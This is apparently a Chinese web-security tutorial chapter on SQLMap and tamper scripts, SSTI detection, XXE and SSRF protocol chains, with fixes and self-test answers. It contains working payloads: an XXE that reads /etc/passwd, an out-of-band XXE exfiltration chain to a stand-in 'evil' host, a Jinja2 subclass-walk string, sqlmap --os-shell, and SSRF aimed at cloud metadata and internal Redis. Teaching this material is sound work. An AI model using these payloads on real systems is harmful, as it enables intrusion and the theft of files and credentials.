# 03 · 注入深水区——自动化、模板、协议与回传

> 初级篇你手工注入；这一章升级三件事：**工具的工作原理**（SQLMap/tamper）、**新的注入上下文**（SSTI/XXE）、**利用链的延伸**（SSRF 协议族）。

## 🎯 学习目标

1. 说清 SQLMap 各参数的探测逻辑，读懂一次 tamper 脚本源码
2. 手工检测并区分 Jinja2/Twig 的 SSTI
3. 画出 XXE 的 OOB 数据外带流程
4. 讲清 SSRF 中 gopher 协议为什么是"万金油"

## 📖 核心知识

### 3.1 SQLMap 工作流（理解它才敢用）

```bash
sqlmap -r req.txt --batch --level 3 --risk 2 --dbs
# -r 从抓包文件读请求（推荐：参数复杂时手工发包再喂给 sqlmap）
# --level 1-5：测试的注入点范围（Cookie/UA 在 level≥3 才测）
# --risk 1-3：风险（2 以上会用 OR 型语句，可能改数据！生产禁用）
# --os-shell：拿到数据库服务器命令执行（UTL_FILE/写文件链）——高价值高风险
```

**它比你聪明在哪**：自动识别注入类型（报错/布尔/时间/联合）、数据库方言、WAF 特征并自动换 payload。

**tamper 原理**：payload 变换器管道。读一个源码（如 `space2comment.py`）：

```python
def tamper(payload, **kwargs):
    return payload.replace(' ', '/**/')   # 空格→内联注释，绕"空格过滤"
```

学会读 3 个 tamper，就理解了"WAF 绕过 = 编码/变形/等价替换"三件事。

### 3.2 SSTI（模板注入）

**原理**：用户输入被**当模板代码编译**，而不是当数据渲染——和 SQL 注入同构，只是上下文从 SQL 变成模板语法。

**检测指纹**（一次输入区分引擎）：

```
输入：{{7*7}}   ${7*7}   <%= 7*7 %>   {7*7}
返回 49 → Jinja2；再用 {{7*'7'}} 区分：Jinja2=7777777，Twig=49
```

**Jinja2 利用结构**（靶场复现）——沿着"对象→类→基类→子类列表"找 OS 模块：

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

理解 **MRO 链**是核心，背 payload 没用（各版本环境子类序号不同）。

**修复**：模板与数据分离（`render_template('x.html', data=v)` 而非 `render_template_string(v)`）、沙箱引擎、不拼接用户输入进模板字符串。

### 3.3 XXE（XML 外部实体）

**原理**：XML 解析器允许 DTD 定义"实体"，实体可指向外部资源——解析器替你发请求/读文件。

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r><name>&xxe;</name></r>          <!-- 回显型：文件内容出现在响应里 -->
```

**OOB 外带**（无回显时）：

```xml
<!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % c SYSTEM "http://evil.dtd">%c]>
<!-- evil.dtd 里定义: <!ENTITY % wrap "<!ENTITY send SYSTEM 'http://evil/?d=%f;'>">%wrap;%send; -->
```

流程：解析远端 DTD → 参数实体嵌套 → 把文件内容拼进请求 URL → 攻击者 DNS/HTTP 收到数据。**修复**：禁用外部实体（`libxml_disable_entity_loader`/`FEATURE_SECURE_PROCESSING`）、换 JSON、升级解析库。

### 3.4 SSRF 的协议链

| 协议 | 能力 | 场景 |
|---|---|---|
| http/https | 内网 Web、云元数据 | 打 169.254.169.254 拿云凭证 |
| file:// | 本地文件读取 | 读配置/密钥 |
| gopher:// | **可发任意 TCP 报文**（结构化流） | 打内网 Redis 写计划任务、打 MySQL |
| dict:// | 端口探测/简单指令 | 内网端口指纹 |

gopher 为什么强：它把 URL 里的字符**原样变成 TCP 流**——等于"代理任意 TCP 客户端"。修复：出站白名单、禁协议、禁重定向、元数据加固。

## ⚠️ 常见坑

1. `--risk 3` 直接怼生产——OR 型 payload 会修改表数据，**授权测试也要慎用**
2. SSTI 死背 payload——环境不同子类列表就变，理解 MRO 才能现场构造
3. XXE 只会回显型——现实中 OOB 才是主流
4. 把 WAF 绕过当玄学——读 tamper 源码，绕过是工程
5. gopher 链不 URL 编码两次——常见失败原因

## ✅ 自测题

<details>
<summary>1. --level 和 --risk 分别控制什么？</summary>

level 控制测试广度（哪些参数/头被测）；risk 控制.payload 激进度（2+ 使用 OR 型可能改数据）。生产测试用 --risk 1。

</details>

<details>
<summary>2. 如何区分 Jinja2 与 Twig？</summary>

<span v-pre>{{7*'7'}}</span>：Jinja2 对 str*int 做重复得到 "7777777"；Twig 报错或当 49 处理（数字相乘）。

</details>

<details>
<summary>3. XXE 的 OOB 外带为什么要"远端 DTD"？</summary>

参数实体在内部 DTD 子集中不能引用自身嵌套，需要把嵌套定义放到外部 DTD 里绕过解析器限制——外带链的核心技巧。

</details>

<details>
<summary>4. gopher 协议在 SSRF 链中的价值？</summary>

它把 URL 内容按字节还原成 TCP 流，等于让服务器充当任意协议的客户端——攻击内网非 HTTP 服务（Redis/MySQL/SMTP）的桥梁。

</details>

<details>
<summary>5. SSTI 与 XSS 的本质区别？</summary>

都在"渲染层"注入，但 SSTI 的上下文是**模板引擎的代码**（服务端执行）；XSS 的上下文是浏览器 JS（客户端执行）。危害与修复位置完全不同。

</details>
